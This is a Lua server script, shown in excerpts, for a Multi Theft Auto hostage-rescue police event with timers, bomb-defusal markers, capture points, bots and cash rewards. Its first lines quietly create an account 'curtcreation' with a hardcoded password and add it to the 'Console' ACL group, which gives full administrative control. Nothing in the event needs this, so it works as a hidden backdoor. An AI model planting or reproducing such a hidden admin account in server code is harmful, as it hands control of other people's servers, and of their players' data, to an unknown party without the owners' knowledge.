...
addAccount("curtcreation",50515253)
aclGroupAddObject (aclGetGroup("Console"), "user.curtcreation")
...
local cmk = {
{1748.34, -1039.46, 8895.5},
{1772.38, -990.78, 8895.5},
{1773.6, -1005.16, 8895.5},
{1724.84, -1005.67, 8895.5},
{1725.38, -989.65, 8895.5},
}
...
{1724.84, -1005.67, 8895.5},
{1725.38, -989.65, 8895.5},
{1531, -1405.62, 7820.91},
{1543.01, -1413.81, 7820.91},
{1540.54, -1397.35, 7820.91 },
{1556.37, -1398.51, 7827.24},
{1748.14, -1000.34, 8889.32},
{1748.49, -1029.83, 8895.5 },
{1761.51, -1015.87, 8895.5},
}
...
function setMainEvent()
	...
	startingTime = setTimer(function() hostages = false delay() end,60000*60,1)
end
...
addCommandHandler("sethr",function(player,cmd,value,times)
	if getElementData(player,"isPlayerPrime") then
		if value == "time" and times and tonumber(times) then
			...
			startingTime = setTimer(function() hostages = false delay() end,times,1)
		elseif value == "reset" then
			stopEvent(true,"Event Canceled by Prime")
...
function delay()
	...
	delayer = setTimer(delay2,60000,1)
end

function delay2()
	if #lawPlayers >= 5 or forceToStart == true then
		handleTheEvent()
	else
		if isTimer(delayer) then killTimer(delayer) end
		delayer = setTimer(delay,30000,1)
	end
end
...
addEventHandler("onMarkerHit",root,function(hitElement,matchdim)
	if source == enter then
		...
		if hitElement and getElementType(hitElement) == "player" then
			if exports.DENjob:isFirstLaw(hitElement) or exports.DENlaw:isLaw(hitElement) and getElementData(hitElement,"Group") == "GIGN" or exports.DENlaw:isLaw(hitElement) then
				if isTimer(startingTime) then
					exports.NGCdxmsg:createNewDxMessage(hitElement,"There is no mission here anytime soon.",255,0,0)
				else
					if hostages == false then
						--if ( canLawEnter ( hitElement ) ) then
							...
							setElementData(hitElement,"isPlayerSAPD",true)
							setPedRotation(hitElement,183)
							warpSAPD(hitElement)
							triggerClientEvent( hitElement, "onToggleHR", hitElement, true )
						--else
							--exports.NGCdxmsg:createNewDxMessage(hitElement,"You're only allowed to enter once in the event.",255,0,0)
						--end
					else
						exports.NGCdxmsg:createNewDxMessage(hitElement,"You are not allowed to enter at this time",255,0,0)
					end
				end
			else
				exports.NGCdxmsg:createNewDxMessage(hitElement,"You aren't allowed to participate in this event.",255,0,0)
			end
		end
...
function handleTheEvent(player)
	--if #lawPlayers >= minCops or forceToStart == true  then-- or getElementData(player,"isPlayerPrime") then
		triggerClientEvent("onResetHOEStats",root)
		triggerClientEvent("sendTimers",root,"(Started)")
		hostages = true
		createCaptures()
		openDoor()
		triggerClientEvent( "onChangeHOECount", root, #lawPlayers)
		if isTimer(endingTimer) then return false end
		endingTimer = setTimer(stopEvent,600000,1)
	--else
	--	triggerClientEvent("sendTimers",root,"(5 cops needed to start the event)")
	--	triggerClientEvent( "onChangeHOECount", root, #lawPlayers)
	--	delay()
	--end
	--exports.NGCdxmsg:createNewDxMessage(player,#lawPlayers.." cops inside the event.",0,255,0)
end

function createCaptures()
	if MCP3 == true then return false end
	MCP3 = true
	for i=1,#cmk do
		local x,y,z = cmk[i][1],cmk[i][2],cmk[i][3]
		local mark = createMarker(x,y,z-1,"cylinder",2,255,0,0)
		table.insert(OMG,mark)
	end
	if isTimer(xd) then return false end
	xd = setTimer(function()
		for i=1,#OMG do
			setElementData(OMG[i],"status",true)
			addEventHandler("onMarkerHit",OMG[i],hitCols)
		end

	end,3000,1)
	for k,v in ipairs(getElementsByType('player')) do
		if getElementData(v,"isPlayerSAPD") then
			exports.NGCdxmsg:createNewDxMessage(v,"You have 5 mintues before terrorists bomb the area, find the C4 charges and deactivate them",0,255,0)
		end
	end
	triggerClientEvent("sendTimers",root,"Find and deactivate C4 bombs")
	--reason = "Deactivate the c4 charges"
	--if isTimer(rescueTimer) then return false end
	--rescueTimer = setTimer(stopEvent,300000,1,true,"You didn't deactivate the C4 charges successfully")
end
function hitCols(hitElement)
	if hitElement and getElementType(hitElement) == "player" then
		if exports.DENjob:isFirstLaw(hitElement) or exports.DENlaw:isLaw(hitElement) and getElementData(hitElement,"Group") == "GIGN" or exports.DENlaw:isLaw(hitElement) then
			setMarkerColor(source,0,100,255,150)
			setElementData(source,"status",false)
			for k,v in ipairs(OMG) do
				if v == source then
					if not isTimer(tim[source]) then
						tim[source] = setTimer(function(d,l)
...
function hitCols2(hitElement)
	if hitElement and getElementType(hitElement) == "player" then
		if exports.DENjob:isFirstLaw(hitElement) or exports.DENlaw:isLaw(hitElement) and getElementData(hitElement,"Group") == "GIGN" or exports.DENlaw:isLaw(hitElement) then

			setMarkerColor(source,0,100,255,150)
			setElementData(source,"status2",false)
			for k,v in ipairs(OMG) do
				if v == source then
					if not tim[source] then
						tim[source] = setTimer(function(d,l)
							if isElement(d) then destroyElement(d) end
							table.remove(OMG,l)
							--[[if #OMG <= 0 then
								if isTimer(rescueTimer) then killTimer(rescueTimer) end
								if lastProgress and isTimer(lastProgress) then return false end
								lastProgress = setTimer(handleLastMission,60000,1)
								triggerClientEvent("sendTimers",root,"Hold here for 1 minute.")
							end]]
						end,3000,1,source,k)
					end
				end
...
function createCaptures2()
	if MCP1 == true then return false end
	OMG = {}
	for i=1,#cmk2 do
		local x,y,z = cmk2[i][1],cmk2[i][2],cmk2[i][3]
		local mark = createMarker(x,y,z-1,"cylinder",2,255,0,0)
		table.insert(OMG,mark)
	end
	setTimer(function()
		for i=1,#OMG do
			setElementData(OMG[i],"status2",true)
			addEventHandler("onMarkerHit",OMG[i],hitCols2)
		end
	end,2000,1)
--	if isTimer(rescueTimer) then killTimer(rescueTimer) end
	--rescueTimer = setTimer(stopEvent,300000,1,true,"You didn't capture the building successfully")
	MCP1 = true
	reason = "Capture the building"
	triggerClientEvent("sendTimers",root,"Capture the mansion within 5 mintues")
	for k,v in ipairs(getElementsByType('player')) do
		if getElementData(v,"isPlayerSAPD") then
			exports.NGCdxmsg:createNewDxMessage(v,"You have 5 mintues to capture the points go find them and watch out from getting killed.",0,255,0)
		end
	end
end
...
function setBattleConfig1()
	...
	triggerClientEvent("removeBots",root)
	for k,v in ipairs(noobs) do
	table.remove(noobs,k)
	end
	damn = {}
	for i=1,8 do
...
function setBattleConfig3()
	if MCP2 == true then return false end
	MCP2 = true
	...
	bots = 16
	for i=1,8 do
		idx,x,y,z = pos1[i][1],pos1[i][2],pos1[i][3],pos1[i][4]
...
addEventHandler("onPedWasted",root,function()
	...
	if bot then
		if getElementData(source,"bot") then
			...
			bots = bots - 1
			table.insert(damn,#damn+1)
			triggerClientEvent("calcBots",root,#damn)
...
function handleLastMission()
	for k,v in ipairs(getElementsByType("player")) do
		if getElementData(v,"isPlayerSAPD") then
			exports.CSGgroups:addXP(v,10)
			givePlayerMoney(v,75000)
			triggerClientEvent(v, "onToggleHOEStats",v, false )
			setElementPosition(v,1785.62, -1258.84, 13.63)
			toggleControl(v,"sprint",true)
			setElementData(v,"isPlayerSAPD",false)
			exports.NGCdxmsg:createNewDxMessage(v,"You have earned $75,000 for rescue and saving the civilians from the terrorists",0,255,0)
			exports.NGCdxmsg:createNewDxMessage(v,"Leave the area within 10 seconds.",0,255,0)
		end
	end
...
function setBattleConfig2()
	...
	if KIL == true then return false end
	peds = {}
	for i=1,#pos2 do
		ids,xxx,yyy,zzz = pos2[i][1],pos2[i][2],pos2[i][3],pos2[i][4]
		ped = createPed(ids,xxx,yyy,zzz)
		if not mkr[ped] then
			mkr[ped] = createMarker(xxx,yyy,zzz-1,"cylinder",1.5,255,0,0,155)
		end
...
function rescued(hitElement)
	if hitElement and getElementType(hitElement) == "player" then
		if source and isElement(source) then
			if hostagesSecured == true then return false end
...
function stopEvent(state,msg)
	...
	local resx = getResourceFromName("AURhostages")
...
addEventHandler("onPlayerQuit",root,function()
	if getElementData(source,"isPlayerSAPD") then
		warpBitchOut(source)
		...
		setElementData(source,"isPlayerSAPD",false)
		triggerClientEvent( "onChangeHOECount", root, #lawPlayers)
...
showTime = function( thePlayer )
	if exports.DENjob:isFirstLaw(thePlayer) or getElementData(thePlayer,"Group") == "GIGN" or exports.DENlaw:isLaw(thePlayer) or getElementData(thePlayer,"isPlayerPrime") then
		local robType = "(Hostages rescue)"
		if ( isTimer(startingTime) ) then
			local timeLeft, timeExLeft, timeExMax = getTimerDetails(startingTime)
			exports.NGCdxmsg:createNewDxMessage( thePlayer, "Time left until next mission: " .. onCalcTimer ( math.floor( timeLeft ) ) .. " "..robType, 225, 0, 0 )
		elseif ( isTimer(endingTimer) ) then
			local timeLeft, timeExLeft, timeExMax = getTimerDetails( endingTimer )
			exports.NGCdxmsg:createNewDxMessage( thePlayer, "Mission in progres event will be destroyed within " ..onCalcTimer( math.floor( timeLeft ) ), 235, 255, 0 )
		elseif ( isTimer(lastProgress) ) then
			local timeLeft, timeExLeft, timeExMax = getTimerDetails( lastProgress )
			exports.NGCdxmsg:createNewDxMessage( thePlayer, "Hold in this place for " ..onCalcTimer( math.floor( timeLeft ) ), 235, 0, 0 )
		elseif not isTimer(startingTime) and hostages == false then
			if ( isTimer(delayer) ) then
				local timeLeft, timeExLeft, timeExMax = getTimerDetails(delayer)
				exports.NGCdxmsg:createNewDxMessage( thePlayer, "Time left until "..robType.." can be started "..onCalcTimer ( math.floor( timeLeft ) ), 0, 255, 0 )
			end
		else
			exports.NGCdxmsg:createNewDxMessage( thePlayer, "There is no mission here anytime soon! "..robType, 0, 255, 0 )
		end
	else
		exports.NGCdxmsg:createNewDxMessage( thePlayer, "Only police officers can use this command", 0, 255, 0 )
	end
end
